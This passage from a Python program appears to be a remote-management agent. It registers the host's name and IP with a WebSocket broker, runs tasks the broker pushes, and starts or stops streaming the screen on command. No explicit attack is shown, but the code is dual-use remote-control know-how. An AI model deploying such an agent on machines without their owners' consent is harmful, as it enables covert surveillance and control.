        send_task_result(task_id, "success", result)
        return

    # Unsupported task
    output = f"Unsupported task: {task_name}"
    log(output)
    send_task_result(task_id, "error", output)


def handle_ws_message(message: Dict[str, Any], client: SimpleWebSocketClient) -> None:
    msg_type = str(message.get("type") or "").strip().lower()

    if msg_type == "task":
        handle_task(message)
        return

    if msg_type == "screen_control":
        action = str(message.get("action") or "").strip().lower()
        if action == "start":
            log("Received screen_control:start")
            SCREEN_STREAMER.start(client)
            return
        if action == "stop":
            log("Received screen_control:stop")
            SCREEN_STREAMER.stop("Viewer stopped or disconnected.")
            return

    if msg_type == "registered":
        log(f"Broker registration acknowledged: {message}")
        return

    log(f"Ignoring unsupported WebSocket message: {message}")


# =========================
# Main agent loop (unchanged)
# =========================
def websocket_loop() -> None:
    register_message = {
        "type": "register",
        "peer_type": "agent",
        "agent_uuid": AGENT_UUID,
        "data": {
            "hostname": get_hostname(),
            "local_ip": get_local_ip(),
        },
    }

    while not STOP_EVENT.is_set():
        client = SimpleWebSocketClient(WS_URL)
        try:
            log(f"Connecting to WebSocket broker: {WS_URL}")
            client.connect()
            client.send_json(register_message)
            log(f"Registered to broker as agent_uuid={AGENT_UUID}")

            ping_stop = threading.Event()

            def ping_loop() -> None:
                while not STOP_EVENT.is_set() and not ping_stop.wait(WEBSOCKET_PING_INTERVAL_SECONDS):
                    try:
                        client.send_ping()
                    except Exception as ping_exc:
                        log(f"WebSocket ping failed: {ping_exc}")
                        break

            ping_thread = threading.Thread(target=ping_loop, name="ws-ping-loop", daemon=True)
            ping_thread.start()

            try:
                while not STOP_EVENT.is_set():
                    message = client.recv_json()
                    if not isinstance(message, dict):
                        continue
                    handle_ws_message(message, client)
            finally:
                ping_stop.set()
                ping_thread.join(timeout=1.0)
        except Exception as exc:
            log(f"WebSocket disconnected: {exc}")
        finally:
            SCREEN_STREAMER.on_disconnect()
            client.close()

        if not STOP_EVENT.is_set():
            log(f"Reconnecting in {WEBSOCKET_RECONNECT_DELAY_SECONDS} seconds...")
            STOP_EVENT.wait(WEBSOCKET_RECONNECT_DELAY_SECONDS)


def main() -> int:
    log("Starting agent")
    log(f"Agent UUID: {AGENT_UUID}")
    log(f"State file: {STATE_FILE}")

    heartbeat_thread = threading.Thread(target=heartbeat_loop, name="heartbeat-loop", daemon=True)
    heartbeat_thread.start()

    try:
        websocket_loop()
    except KeyboardInterrupt:
        log("Interrupted by user")
    finally:
        STOP_EVENT.set()
        SCREEN_STREAMER.stop("Agent shutdown.")
        # Stop TCP server if running
        if TCP_SERVER_THREAD and TCP_SERVER_THREAD.is_alive():
            tcp_server_stop()
        heartbeat_thread.join(timeout=2)
        log("Agent stopped")

    return 0


if __name__ == "__main__":
    sys.exit(main())